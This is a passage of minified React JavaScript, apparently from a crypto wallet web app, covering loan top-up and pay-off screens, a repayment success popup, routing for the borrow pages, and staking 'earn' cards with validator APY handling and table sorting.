            be.xG)(T.deposit.currency), "/", H.toUpperCase()) : O.createElement(LoaderDots, {
                visible: !0
            })))), O.createElement("div", {
                className: X7
            }), O.createElement("div", {
                className: "clearfix"
            }), O.createElement("div", {
                className: X5.bottomButtomContainer
            }, d && O.createElement("div", null, O.createElement(loader, {
                visible: !0,
                width: 30
            })), !d && O.createElement("div", null, !c && O.createElement("p", {
                className: X5.bottomInformation
            }, "Network fee excluded: ", x ? (0,
            Ko.yF)(x, 6) : O.createElement(LoaderDots, {
                visible: !0
            }), " ", (0,
            be.xG)(null == I ? void 0 : I.currency), O.createElement("span", null, "≈ ", x ? (0,
            Ko.SJ)(P(x, null != I ? I : void 0, D), !0) : O.createElement(LoaderDots, {
                visible: !0
            }), " USD")), c && O.createElement("p", {
                className: X5.transactionError
            }, c)), O.createElement(Yl, {
                size: "big",
                color: "blue",
                onClick: handleTopUp,
                id: "borrowTopUpConfirm"
            }, "Confirm")), O.createElement("div", {
                className: "clearfix"
            }))), O.createElement("div", {
                className: "col-xs-5"
            }, T ? O.createElement(EChartProvider, null, O.createElement(EChart, {
                walletChartData: {
                    currency: T.deposit.currency,
                    family: T.deposit.currency_network,
                    smartContract: null == T || null === (r = T.deposit) || void 0 === r ? void 0 : r.smartContract
                },
                isSmallChart: !0
            })) : O.createElement(ChartLoader, {
                className: ree
            })))
        }
          , lee = "popup-success_popup_Ik8Is"
          , see = "popup-success_header_1nkdp"
          , iee = "popup-success_headerSubTitle_2PN47"
          , oee = "popup-success_headerTitle_X-TRn"
          , cee = "popup-success_iconSuccess_1MgZy"
          , uee = "popup-success_currecniesPairs_GAybj"
          , dee = "popup-success_currencyBlock_38zhF"
          , mee = "popup-success_currencySeparator_1K5r_"
          , pee = "popup-success_body_3iiIS"
          , fee = "popup-success_bottomButton_2_S0d"
          , Eee = "popup-success_currencyTicker_3obQu"
          , hee = "popup-success_currencyAmountGreen_3kHSR"
          , gee = "popup-success_currencyAmount_1OU7y";
        function components_popup_success_PopupLoanSuccess(e) {
            return O.createElement(aa, {
                visible: e.visible,
                width: 370,
                onClose: e.onClose,
                className: lee
            }, O.createElement("div", {
                className: see
            }, O.createElement("div", {
                className: iee
            }, "Loan paid off"), O.createElement("div", {
                className: oee
            }, "Success!"), O.createElement("div", {
                className: cee
            })), O.createElement("div", {
                className: pee
            }, O.createElement("p", null, "You will receive your collateral within 5-10 minutes."), O.createElement("div", {
                className: uee
            }, O.createElement("div", {
                className: dee
            }, O.createElement(IconCurrency, {
                currency: e.data.currencyFrom
            }), O.createElement("span", {
                className: gee
            }, "- ", e.data.amountFrom), O.createElement("span", {
                className: Eee
            }, (0,
            be.xG)(e.data.currencyFrom))), O.createElement("div", {
                className: mee
            }), O.createElement("div", {
                className: dee
            }, O.createElement(IconCurrency, {
                currency: e.data.currencyTo
            }), O.createElement("span", {
                className: hee
            }, "+ ", e.data.amountTo, " "), O.createElement("span", {
                className: Eee
            }, (0,
            be.xG)(e.data.currencyTo))))), O.createElement("div", {
                className: fee,
                onClick: e.onClose
            }, "OK"))
        }
        const BoardPayOffPage = () => {
            var e, t, a, n, r, l, s, i, o;
            const c = (0,
            j.k6)()
              , u = (0,
            j.$B)()
              , d = (0,
            $.I0)()
              , [m,p] = (0,
            O.useState)()
              , [f,E] = (0,
            O.useState)("")
              , [h,g] = (0,
            O.useState)(null)
              , [y,v] = (0,
            O.useState)()
              , [_,w] = (0,
            O.useState)(!1)
              , [b,k] = (0,
            O.useState)(!1)
              , [S,C] = (0,
            O.useState)(!1)
              , [N,T] = (0,
            O.useState)(!1)
              , [A,x] = (0,
            O.useState)({})
              , [I,P] = (0,
            O.useState)(!1)
              , [L,F] = (0,
            O.useState)(null)
              , [W,R] = (0,
            O.useState)()
              , B = (0,
            $.v9)(L3)
              , D = String(u.params.loanId)
              , U = B(D)
              , [G,V] = (0,
            O.useState)(!1)
              , K = (0,
            O.useRef)()
              , H = (0,
            $.v9)($c)
              , Z = (0,
            $.v9)(Xc)
              , Y = (0,
            $.v9)(x3)
              , q = (0,
            $.v9)(P3)(null == y ? void 0 : y.currency, null == y ? void 0 : y.family)
              , X = useWalletsToSendLoan(H, null == U ? void 0 : U.repayment)
              , {convertToFiat: Q, convertToCrypto: J} = useConverter()
              , [ee] = fee_wallet(null != h ? h : void 0)
              , [te] = use_fee(null != h ? h : void 0, null != h ? h : void 0, m)
              , [ae] = usePrecision(null != h ? h : void 0)
              , {localCurrency: ne} = local_currency_useLocalCurrency()
              , re = Q(te, null != ee ? ee : void 0, ne)
              , le = (0,
            Ko.SJ)(re, !0)
              , [se,ie] = (0,
            O.useState)(null)
              , oe = (0,
            O.useMemo)(( () => ae || 6), [ae])
              , setErrors = () => {
                C(!0);
                P(!1)
            }
              , fetchPledge = async () => {
                let e;
                ie(null);
                try {
                    var t;
                    if (void 0 === (null == U ? void 0 : U.loan_id)) {
                        setErrors();
                        return
                    }
                    e = await d(CreatePledgeRedemptionTx(D, String(null == y ? void 0 : y.address), null == U || null === (t = U.loan) || void 0 === t ? void 0 : t.receive_extra_id));
                    ie(e.address);
                    await R(await d(fetchLoanById(null == U ? void 0 : U.loan_id)))
                } catch (e) {
                    setErrors();
                    return
                }
                e || setErrors()
            }
            ;
            (0,
            O.useEffect)(( () => {
                void 0 !== (null == y ? void 0 : y.address) && fetchPledge()
            }
            ), [null == y ? void 0 : y.address]);
            const ce = (0,
            O.useMemo)(( () => {
                var e, t;
                const a = J(re, h, "usd")
                  , n = (0,
                Ko.PD)((null == W || null === (e = W.repayment) || void 0 === e ? void 0 : e.amount) || 0, (null == W || null === (t = W.repayment) || void 0 === t ? void 0 : t.fee) || 0);
                return (0,
                Ko.Lq)((0,
                Ko.PD)(n, a), oe)
            }
            ), [J, re, h, null == W || null === (e = W.repayment) || void 0 === e ? void 0 : e.amount, null == W || null === (t = W.repayment) || void 0 === t ? void 0 : t.fee, oe])
              , [ue] = use_fee(null != h ? h : void 0, null != h ? h : void 0, Number(ce) || (null == h ? void 0 : h.balance));
            (0,
            O.useEffect)(( () => {
                !m && U && p(ce);
                !f && U && E((0,
                Ko.FH)(U.deposit.amount, {
                    max: (null == q ? void 0 : q.decimal_places) || 6
                }))
            }
            ), [U, ue, m, f, ce]);
            (0,
            O.useEffect)(( () => {
                var e;
                if (!U)
                    return;
                const t = null == Y || null === (e = Y.deposit) || void 0 === e ? void 0 : e.find((e => (0,
                Ho.t)(e.currency) === (0,
                Ho.t)(U.deposit.currency)));
                t && F(t.additional_fees.toString())
            }
            ), [U, Y]);
            const coinRabbitSupportedFilter = e => onCustomFilterWallets(e, [""], {
                borrowLoansCurrencies: Y.loans,
                withSubWallets: !0
            })
              , parentWalletActiveFilter = e => onCustomFilterWallets(e, [""], {
                borrowLoansCurrencies: Y.loans
            })
              , de = (0,
            O.useCallback)((e => {
                var t;
                return e.currency === (0,
                Ho.t)(null == U || null === (t = U.deposit) || void 0 === t ? void 0 : t.currency)
            }
            ), [null == U || null === (a = U.deposit) || void 0 === a ? void 0 : a.currency]);
            (0,
            O.useEffect)(( () => {
                const e = [...H, ...Z].filter(coinRabbitSupportedFilter)
                  , t = e.find((e => {
                    var t;
                    const a = undefined;
                    if (!!e.family) {
                        var n, r;
                        return e.currency === (0,
                        Ho.t)(null == U || null === (n = U.loan) || void 0 === n ? void 0 : n.currency) && e.family === (0,
                        Ho.t)(null == U || null === (r = U.loan) || void 0 === r ? void 0 : r.currency_network)
                    }
                    return e.currency === (0,
                    Ho.t)(null == U || null === (t = U.loan) || void 0 === t ? void 0 : t.currency)
                }
                ));
                !h && e[0] && g(t || e[0]);
                const a = H.filter(de)
                  , n = H.reduce(( (e, t) => e.concat(t.subWallets.filter(de))), []).filter((e => {
                    var t;
                    return (0,
                    Ho.t)(e.currency) === (0,
                    Ho.t)(null == U || null === (t = U.deposit) || void 0 === t ? void 0 : t.currency)
                }
                ));
                !y && a[0] && v(a[0]);
                if (!y && !a[0] && n[0]) {
                    w(!0);
                    v(n[0])
                }
            }
            ), [H, Y, de, U, Z, coinRabbitSupportedFilter]);
            const me = (0,
            Ko.lt)(null == ee ? void 0 : ee.balance, ue)
              , pe = {
                collateralCurrency: null == U || null === (n = U.deposit) || void 0 === n ? void 0 : n.currency,
                borrowCurrency: null == U || null === (r = U.loan) || void 0 === r ? void 0 : r.currency
            };
            async function handlePayOff() {
                var e, t;
                const {isValid: a} = null !== (e = null === (t = K.current) || void 0 === t ? void 0 : t.validate()) && void 0 !== e ? e : {};
                if (me) {
                    V(!0);
                    return
                }
                if (!a) {
                    V(!0);
                    setTimeout(( () => V(!1)), 3e3);
                    return
                }
                P(!0);
                if (null === se)
                    return;
                const n = {
                    currency: null == h ? void 0 : h.currency,
                    address: se
                };
                z()(h, "walletFrom is undefined");
                z()(n.currency, "toWallet.currency is undefined");
                z()(ee, "feeWallet is undefined");
                z()(m, "valueFrom is undefined");
                z()(ue, "fee is undefined");
                z()(ce, "loanRepayment is undefined");
                const r = await Se.Z.getApiByWallet(h);
                let l = "NaN";
                r.getGasLimit && (l = await r.getGasLimit({
                    addressFrom: h.address,
                    privateKey: h.privateKey,
                    amount: ce,
                    addressTo: null == n ? void 0 : n.address
                }));
                let s = "NaN";
                r.getGasPrice && (s = await r.getGasPrice());
                try {
                    const e = await tM.send("loan", h, n, ee, {
                        amount: ce,
                        isFeeIncluded: !1,
                        fee: ue,
                        gasLimit: l,
                        gasPrice: s
                    });
                    if (e.error) {
                        var i;
                        cc.$.send(cc.d.BORROW_LOAN_CLOSED_ERROR);
                        ge.b.error(ge.d.LOAN_PAYOFF_FAILED, pe);
                        k((null === (i = e.error) || void 0 === i ? void 0 : i.text) || e.error);
                        P(!1);
                        return
                    }
                    if (e.hash) {
                        cc.$.send(cc.d.BORROW_LOAN_CLOSED_DONE);
                        ge.b.success(ge.d.LOAN_PAYOFF_SUCCESS, pe);
                        x({
                            currencyFrom: null == h ? void 0 : h.currency,
                            amountFrom: m,
                            currencyTo: null == y ? void 0 : y.currency,
                            amountTo: f
                        });
                        T(!0)
                    }
                } catch (e) {
                    cc.$.send(cc.d.BORROW_LOAN_CLOSED_ERROR);
                    ge.b.error(ge.d.LOAN_PAYOFF_FAILED, pe);
                    k(e.message)
                }
                P(!1)
            }
            const handleChangeWalletFrom = e => {
                g(e);
                V(!1)
            }
              , fe = {
                available: (null == h ? void 0 : h.balance) || "0",
                minimalFee: ue,
                min: 1e-5,
                max: null == h ? void 0 : h.balance,
                precision: oe
            };
            return O.createElement(sf(), {
                ref: K
            }, O.createElement(components_popup_success_PopupLoanSuccess, {
                visible: N,
                onClose: () => {
                    T(!1);
                    c.push((0,
                    M.RU)("/borrow"))
                }
                ,
                data: A
            }), O.createElement("div", {
                className: "col-xs-7"
            }, O.createElement("div", {
                className: X5.borrowBorderContainer
            }, O.createElement("div", {
                className: $7
            }, O.createElement(BackButton, {
                color: "gray"
            }), O.createElement("h1", {
                className: Z7
            }, "Pay off loan"), O.createElement("div", {
                className: Y7
            })), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: ce,
                rules: [...zf.amount(fe)]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(O.Fragment, null, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: "Send a loan from",
                    value: ce,
                    fiat: h ? h.currency : void 0,
                    isInvalid: !t && G,
                    disabled: !0
                }, O.createElement("div", {
                    className: J7
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    inputWrapperClassName: eee,
                    selectedWallet: null != h ? h : void 0,
                    onChange: handleChangeWalletFrom,
                    wallets: null != X ? X : [],
                    customFilter: coinRabbitSupportedFilter,
                    additionalFilter: parentWalletActiveFilter,
                    newArrow: !0
                }))), !t && G && O.createElement("div", {
                    className: Q7
                }, a))
            }
            ))), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: y,
                rules: [...zf.wallet]
            }, (e => {
                var t;
                let {isValid: a, message: n} = e;
                return O.createElement(O.Fragment, null, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: "Receive collateral",
                    value: f,
                    fiat: y && y.currency,
                    disabled: !0
                }, O.createElement("div", {
                    className: J7
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    inputWrapperClassName: eee,
                    selectedWallet: y,
                    onChange: v,
                    wallets: H,
                    customFilter: e => onCustomFilterWallets(e, [(null == y ? void 0 : y.currency) || ""]),
                    isDisabledParentWallet: _,
                    isSelectFirstSubwallet: _,
                    notSelectParentWallet: _,
                    newArrow: !0,
                    emptyPlaceholder: `You can select only ${null == y || null === (t = y.currency) || void 0 === t ? void 0 : t.toUpperCase()} here`
                }))), !a && G && O.createElement("div", {
                    className: Q7
                }, n))
            }
            ))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, {
                className: nee
            }, "Additional fees:"), O.createElement(misk_info_modern_MiskInfoValue, null, "$0 for loans longer than 30 days, otherwise $", L || O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement("div", {
                className: X7
            }), me && G && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", null == ee ? void 0 : ee.currency.toUpperCase(), " balance to pay the network fee. You need ", ue, " ", null == ee || null === (l = ee.currency) || void 0 === l ? void 0 : l.toUpperCase(), ".", O.createElement("br", null), "Available balance: ", null == ee ? void 0 : ee.balance, " ", null == ee || null === (s = ee.currency) || void 0 === s ? void 0 : s.toUpperCase(), ".", " ", O.createElement("a", {
                href: "https://support.guarda.com/assets/how-to-send-tokens",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Why do I need ", null == ee || null === (i = ee.currency) || void 0 === i ? void 0 : i.toUpperCase(), "? ", O.createElement(VA, {
                src: uD,
                alt: "Open Link"
            }))), O.createElement("div", {
                className: "clearfix"
            }), O.createElement("div", {
                className: X5.bottomButtomContainer
            }, I && O.createElement("div", null, O.createElement(loader, {
                visible: !0,
                width: 30
            })), !I && O.createElement("div", null, !b && !S && O.createElement("p", {
                className: X5.bottomInformation
            }, "Network fee excluded: ", ue ? (0,
            Ko.yF)(ue, 6) : O.createElement(LoaderDots, {
                visible: !0
            }), " ", (0,
            be.xG)(null == ee ? void 0 : ee.currency), O.createElement("span", null, "≈ ", ue ? le : O.createElement(LoaderDots, {
                visible: !0
            }), " USD")), b && O.createElement("p", {
                className: X5.transactionError
            }, b), S && O.createElement("p", {
                className: X5.transactionError
            }, "Loan is linked to another user. ", O.createElement("a", {
                href: "https://support.guarda.com?widget=open",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Contact support"), ".")), O.createElement(Yl, {
                disabled: I || null === ue || null === se || void 0 === W,
                size: "big",
                color: "blue",
                onClick: handlePayOff,
                id: "borrowPayOffConfirm"
            }, "Confirm")), O.createElement("div", {
                className: "clearfix"
            }))), O.createElement("div", {
                className: "col-xs-5"
            }, U ? O.createElement(EChartProvider, null, O.createElement(EChart, {
                walletChartData: {
                    currency: U.deposit.currency,
                    family: U.deposit.currency_network,
                    smartContract: null == U || null === (o = U.deposit) || void 0 === o ? void 0 : o.smartContract
                },
                isSmallChart: !0
            })) : O.createElement(ChartLoader, {
                className: ree
            })))
        }
          , BorrowRouter = () => {
            const e = (0,
            $.v9)(oe.Yq)
              , t = (0,
            $.v9)(oe.Oj);
            return O.createElement(j.rs, null, !e && O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/borrow",
                component: WelcomeRoot
            })), e && !t && O.createElement(j.AW, {
                path: "/app/borrow",
                component: EnterPasswordPage
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/borrow",
                component: BorrowBoardIndex
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/borrow/view/:loanId",
                component: BorrowViewPage
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/borrow/top-up/:loanId",
                component: BoardTopUpPage
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/borrow/pay-off/:loanId",
                component: BoardPayOffPage
            }), O.createElement(j.AW, {
                component: _404
            }))
        }
        ;
        function BorrowPage_BorrowIndexPage() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(oe.Oj)
              , a = (0,
            $.v9)($c)
              , n = (0,
            $.v9)(Bo);
            (0,
            O.useEffect)(( () => {
                async function initialize() {
                    try {
                        if (t && !a.length) {
                            const t = await e(restoreStorage());
                            e(restoreWallets(t.wallets))
                        }
                    } catch (e) {}
                }
                initialize()
            }
            ), []);
            async function fetchLoans() {
                e(fetchSystemBorrowStatus());
                e(fetchLoanCurrencies());
                e(fetchUserLoans())
            }
            (0,
            O.useEffect)(( () => {
                !0 !== n && fetchLoans()
            }
            ), [t, n]);
            return O.createElement("div", {
                className: Ht()(p5)
            }, O.createElement(HeaderWallets, null), O.createElement("div", {
                className: Ht()(f5)
            }, O.createElement(sb, null, O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement(BorrowRouter, null))))), O.createElement(Footer_Footer, null))
        }
        const yee = a.p + "16e9e61a503bba9d13180fc36c2bf7f0.svg"
          , vee = a.p + "76278f14158dbb6ae3a8bbd1a6ec28fe.svg"
          , _ee = a.p + "433b7c623f8cd5b036fda98c5f0ccb42.svg"
          , wee = a.p + "d1441fad9c72d6791f91d15ac9a0bc4e.svg"
          , bee = "earn_row_1DJuK"
          , kee = "earn_rowDirection_28t1O"
          , See = "earn_rowBetween_1lspI"
          , Cee = "earn_rowCenter_8GF4W"
          , Nee = "earn_rowEnd_y1g_d"
          , Tee = "earn_rowAround_PQL1W"
          , Aee = "earn_rowAlignCenter_115yl"
          , xee = "earn_rowAlignEnd_2OgoL"
          , Iee = "earn_rowMarginBottomM_2zinT"
          , Pee = "earn_rowMarginBottomS_1lUUJ"
          , Lee = "earn_rowMarginTopM_3UR3H"
          , Fee = "earn_rowMarginTopS_1S2Ir"
          , Wee = "earn_rowMarginLeftM_1yHfO"
          , Ree = "earn_rowMarginLeftS_37U_Y"
          , Bee = "earn_rowMarginRightM_1JALn"
          , Oee = "earn_rowMarginRightS_1KVHv"
          , Dee = "earn_fontRoboto_2CsIW"
          , Mee = "earn_width100_DFhwB"
          , Uee = "earn_textAlignCenter_1dGpw"
          , Gee = "earn_textAlignEnd_2mq1K"
          , Vee = "earn_textAlignStart_34KVb"
          , Kee = "card-item_cardTitle_2yTzB"
          , Hee = "card-item_stepper_2zwlV"
          , zee = "card-item_walletTitle_-hT1t"
          , jee = "card-item_walletTicker_3vYU-"
          , $ee = "card-item_info_lz4Oz"
          , CardItem_CardItem = e => {
            let {title: t, currentStep: a, totalStep: n, currency: r, walletTitle: l, listOfInfo: s, buttonTitle: i, path: o, prevStep: c, nextStep: u} = e;
            const d = (0,
            $.v9)(Ot)
              , m = (0,
            O.useMemo)(( () => "dark" === d), [d]);
            return O.createElement("div", null, O.createElement("div", {
                className: Ht()(bee, See, Iee)
            }, O.createElement("h2", {
                className: Ht()(Dee, Kee)
            }, t), O.createElement("div", {
                className: Ht()(bee, Aee)
            }, O.createElement("img", {
                src: m ? _ee : yee,
                width: 24,
                height: 24,
                alt: "slider-arrow-left",
                onClick: c
            }), O.createElement("span", {
                className: Ht()(Dee, Hee)
            }, a, " / ", n), O.createElement("img", {
                src: m ? wee : vee,
                width: 24,
                height: 24,
                alt: "slider-arrow-right",
                onClick: u
            }))), O.createElement("div", {
                className: Ht()(bee, Aee, Iee, Lee)
            }, O.createElement(IconCurrency, {
                currency: r
            }), O.createElement("div", {
                className: Ht()(Dee, zee)
            }, l, O.createElement("span", {
                className: Ht()(jee)
            }, r))), s.map((e => O.createElement("div", {
                key: `${e.leftSide}${e.rightSide}`,
                className: Ht()(bee, See, Pee, Fee)
            }, O.createElement("div", {
                className: Ht()(Dee, $ee)
            }, e.leftSide), O.createElement("div", {
                className: Ht()(Dee, $ee)
            }, e.rightSide)))), O.createElement("div", {
                className: Ht()(Lee)
            }, O.createElement(Y.OL, {
                to: o
            }, O.createElement(Yl, {
                className: Mee,
                color: "blue"
            }, i))))
        }
          , Zee = "empty-card-item_emptyBgr_2foOA"
          , Yee = "empty-card-item_emptyCircle_FqS01"
          , qee = "empty-card-item_emptyStepper_2XmU3"
          , Xee = "empty-card-item_emptyLargeBlock_1sPD1"
          , Qee = "empty-card-item_emptyMediumBlock_D92Ca"
          , Jee = "empty-card-item_emptySmallBlock_PIZSP"
          , EmptyCardItem_EmptyCardItem = () => O.createElement("div", null, O.createElement("div", {
            className: Ht()(bee, See, Iee)
        }, O.createElement("span", {
            className: Ht()(Qee, Zee)
        }), O.createElement("div", {
            className: Ht()(bee, Aee)
        }, O.createElement("span", {
            className: Ht()(Yee, Zee)
        }), O.createElement("span", {
            className: Ht()(qee, Zee, Wee, Bee)
        }), O.createElement("span", {
            className: Ht()(Yee, Zee)
        }))), O.createElement("div", {
            className: Ht()(bee, Aee, Iee, Lee)
        }, O.createElement("span", {
            className: Ht()(Yee, Zee, Bee)
        }), O.createElement("span", {
            className: Ht()(Qee, Zee)
        })), O.createElement("div", {
            className: Ht()(bee, See, Pee, Fee)
        }, O.createElement("span", {
            className: Ht()(Qee, Zee)
        }), O.createElement("span", {
            className: Ht()(Jee, Zee)
        })), O.createElement("div", {
            className: Ht()(bee, See, Pee, Fee)
        }, O.createElement("span", {
            className: Ht()(Qee, Zee)
        }), O.createElement("span", {
            className: Ht()(Jee, Zee)
        })), O.createElement("div", {
            className: Ht()(bee, Lee)
        }, O.createElement("span", {
            className: Ht()(Xee, Zee)
        })))
          , getDefaultValidators = e => {
            let {zilDefaultValidator: t, adaDefaultValidator: a, ethDefaultValidator: n, xtzDefaultValidator: r, trxDefaultValidator: l, atomDefaultValidator: s, oneDefaultValidator: i, ontDefaultValidator: o, qtumDefaultValidator: c} = e;
            return {
                zil: t,
                "ada-shelley": a,
                eth: n,
                xtz: r,
                trx: l,
                clo: {
                    title: "",
                    apy: "10%"
                },
                atom: s,
                one: i,
                ont: o,
                now: {
                    title: "",
                    apy: "10%"
                },
                kmd: {
                    title: "",
                    apy: "10%"
                },
                qtum: c
            }
        }
          , mapValidatorToUnifiedValidator = e => {
            let {ticker: t, validator: a} = e;
            const n = {
                title: "",
                apy: ""
            };
            if (a)
                switch (t) {
                case "zil":
                    n.title = a.title || "";
                    n.apy = a.annualYield || "";
                    break;
                case "ada-shelley":
                    n.title = a.name || "";
                    n.apy = a.marginFee || "";
                    break;
                case "eth":
                case "clo":
                    n.title = a.title || "";
                    n.apy = a.apy || "";
                    break;
                case "xtz":
                case "atom":
                case "ont":
                    n.title = a.title || "";
                    n.apy = a.rate || "";
                    break;
                case "trx":
                    n.title = a.title || "";
                    n.apy = a.rate.toString() || "";
                    break;
                case "one":
                    n.title = a.title || "";
                    n.apy = a.subtitle || "";
                    break;
                default:
                    return n
                }
            if (!n.apy.length || "%" === n.apy.substring(n.apy.length - 1))
                return n;
            n.apy = `${n.apy}%`;
            return n
        }
          , useDefaultValidators = () => {
            const {defaultValidator: e} = JI()
              , {defaultValidator: t} = PI()
              , {defaultValidator: a} = use_eth_validators()
              , {defaultValidator: n} = bx()
              , {defaultRepresentative: r} = nH()
              , {defaultValidator: l} = bI()
              , {defaultValidator: s} = Lx()
              , {defaultValidator: i} = tI()
              , {defaultValidator: o} = IZ()
              , c = (0,
            O.useMemo)(( () => getDefaultValidators({
                adaDefaultValidator: t,
                atomDefaultValidator: l,
                ethDefaultValidator: a,
                oneDefaultValidator: i,
                ontDefaultValidator: s,
                trxDefaultValidator: r,
                xtzDefaultValidator: n,
                zilDefaultValidator: e,
                qtumDefaultValidator: o
            })), [t, l, a, i, s, r, n, e, o])
              , u = (0,
            O.useCallback)((e => {
                let {ticker: t} = e;
                return mapValidatorToUnifiedValidator({
                    ticker: t,
                    validator: c[t]
                })
            }
            ), [c])
              , d = (0,
            O.useCallback)((e => {
                let {ticker: t} = e;
                const a = u({
                    ticker: t
                }).apy;
                return a.length && "%" !== a.substring(a.length - 1) ? `${a}%` : a
            }
            ), [u]);
            return {
                defaultValidators: c,
                getDefaultValidatorByTicker: u,
                getDefaultValidatorAPYByTicker: d
            }
        }
          , ete = {
            list: ["zil", "ada-shelley", "xtz", "trx"],
            title: "No lock-up period"
        }
          , tte = {
            list: ["zil", "xtz", "trx", "atom", "ont"],
            title: "Start with any amount",
            min_amount: Lc
        }
          , ate = {
            list: ["trx", "one"],
            title: "Fast reward"
        }
          , mapCardItemInfo = e => {
            let {defaultValidator: t, minAmount: a, balance: n} = e;
            const r = [];
            t && r.push({
                leftSide: null != t && t.title ? `${null == t ? void 0 : t.title} APY` : "APY",
                rightSide: (null == t ? void 0 : t.apy) || ""
            });
            n && r.push({
                leftSide: "Balance",
                rightSide: n
            });
            a && r.push({
                leftSide: "Min amount",
                rightSide: a.toString()
            });
            return r
        }
          , getQuickStartList = e => {
            let {stakingWallets: t} = e;
            const a = {
                title: "Quick start",
                list: []
            };
            t.forEach((e => {
                (0,
                Ko.gt)(e.balance, 0) && (0,
                Ko.eg)(e.balance, getMinStakingAmountByTicker({
                    ticker: e.currency
                })) && a.list.push(e.currency)
            }
            ));
            return a
        }
          , getListElementData = e => {
            let {ticker: t, wallet: a, defaultValidators: n, title: r, minAmount: l} = e;
            if (a.currency === t) {
                const e = mapCardItemInfo({
                    balance: l ? void 0 : a.balance,
                    minAmount: l ? l.toString() : void 0,
                    defaultValidator: mapValidatorToUnifiedValidator({
                        ticker: a.currency,
                        validator: n[t]
                    })
                });
                return {
                    title: r,
                    currency: a.currency,
                    walletTitle: a.title,
                    listOfInfo: e,
                    buttonTitle: getButtonTitleForNewStakingAction({
                        balance: a.balance,
                        ticker: a.currency,
                        withTicker: !0
                    }),
                    path: getURLForNewStakingAction({
                        ticker: t,
                        uuid: a.uuid,
                        balance: a.balance
                    })
                }
            }
        }
          , getInfoForCards = e => {
            let {haveStaking: t, stakingWallets: a, QUICK_START: n, defaultValidators: r} = e;
            const l = [];
            t || a.map((e => {
                ete.list.map((t => {
                    const a = getListElementData({
                        ticker: t,
                        wallet: e,
                        defaultValidators: r,
                        title: ete.title
                    });
                    a && l.push(a)
                }
                ));
                tte.list.map((t => {
                    const a = getListElementData({
                        ticker: t,
                        wallet: e,
                        defaultValidators: r,
                        title: tte.title,
                        minAmount: getMinStakingAmountByTicker({
                            ticker: t
                        })
                    });
                    a && l.push(a)
                }
                ));
                ate.list.map((t => {
                    const a = getListElementData({
                        ticker: t,
                        wallet: e,
                        defaultValidators: r,
                        title: ate.title
                    });
                    a && l.push(a)
                }
                ));
                n.list.map((t => {
                    const a = getListElementData({
                        ticker: t,
                        wallet: e,
                        defaultValidators: r,
                        title: n.title
                    });
                    a && l.push(a)
                }
                ))
            }
            ));
            return l
        }
          , useCardsList = e => {
            let {haveStaking: t} = e;
            const a = (0,
            $.v9)($c)
              , n = getBestBalanceStakingWallets({
                wallets: a
            })
              , {defaultValidators: r} = useDefaultValidators()
              , l = (0,
            O.useMemo)(( () => getQuickStartList({
                stakingWallets: n
            })), [n])
              , s = undefined;
            return {
                list: (0,
                O.useMemo)(( () => getInfoForCards({
                    stakingWallets: n,
                    haveStaking: t,
                    QUICK_START: l,
                    defaultValidators: r
                })), [l, r, t, n])
            }
        }
          , nextStepHandler = e => {
            let {currentCardIndex: t, maxStep: a, changeCurrentCardIndex: n} = e;
            t + 1 >= a || n(t + 1)
        }
          , prevStepHandler = e => {
            let {currentCardIndex: t, changeCurrentCardIndex: a} = e;
            0 !== t && a(t - 1)
        }
          , CardsBlock = () => {
            const {list: e} = useCardsList({
                haveStaking: !1
            })
              , [t,a] = (0,
            O.useState)(0)
              , changeCurrentCardIndex = e => {
                a(e)
            }
            ;
            return e.length > 0 ? O.createElement(CardItem_CardItem, {
                key: `${e[t].title}${e[t].currency}${e[t].buttonTitle}`,
                title: e[t].title,
                currentStep: String(t + 1),
                totalStep: String(e.length),
                currency: e[t].currency,
                walletTitle: e[t].walletTitle,
                listOfInfo: e[t].listOfInfo,
                buttonTitle: e[t].buttonTitle,
                path: e[t].path,
                nextStep: () => nextStepHandler({
                    currentCardIndex: t,
                    maxStep: e.length,
                    changeCurrentCardIndex
                }),
                prevStep: () => prevStepHandler({
                    currentCardIndex: t,
                    changeCurrentCardIndex
                })
            }) : O.createElement(EmptyCardItem_EmptyCardItem, null)
        }
          , useSearchValue = () => {
            const [e,t] = (0,
            O.useState)("")
              , a = (0,
            O.useMemo)(( () => debounce(t, 300)), [t])
              , n = undefined;
            return {
                searchValue: e,
                changeHandler: e => {
                    let {target: {value: t}} = e;
                    return a(t)
                }
            }
        }
          , nte = "DEFAULT_TABLE_SORT"
          , rte = "COIN_UP_TABLE_SORT"
          , ste = "COIN_DOWN_TABLE_SORT"
          , ite = "APY_UP_TABLE_SORT"
          , ote = "APY_DOWN_TABLE_SORT"
          , cte = "MIN_AMOUNT_UP_TABLE_SORT"
          , ute = "MIN_AMOUNT_DOWN_TABLE_SORT"
          , getNextSortType = e => {
            let {type: t, actualSortType: a} = e;
            switch (t) {
            case rte:
                return a === rte ? ste : rte;
            case ite:
                return a === ite ? ote : ite;
            case cte:
                return a === cte ? ute : cte;
            default:
                return nte
            }
        }
          , getApyNumFromStr = e => Number(e.trim().replace("%", ""))
          , useTableSort = e => {
            let {list: t, sortType: a} = e;
            switch (a) {
            case rte:
                return {
                    list: t.sort(( (e, t) => titleCompare(e.walletTitle, t.walletTitle)))
                };
            case ste:
                return {
                    list: t.sort(( (e, t) => titleCompare(t.walletTitle, e.walletTitle)))
                };
            case ite:
                return {
                    list: t.sort(( (e, t) => {
                        const a = undefined
                          , n = undefined;
                        return getApyNumFromStr(e.validatorAPY) > getApyNumFromStr(t.validatorAPY) ? -1 : 1
                    }
                    ))
